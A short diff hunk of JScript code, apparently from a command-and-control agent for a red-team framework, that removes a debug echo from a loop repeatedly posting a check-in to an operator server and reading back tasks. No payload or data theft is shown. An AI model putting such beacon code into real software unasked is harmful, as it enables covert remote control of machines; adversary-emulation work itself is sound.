@@ -134,7 +134,7 @@ function parse_Execute(task)
 
 while(true)
 	{
-		WScript.Echo(postText(prelude_operator_server, JSONCheckin));
+		
 		var checkin_Response = postText(prelude_operator_server, JSONCheckin);
 
 		if(checkin_Response.length < 1) {
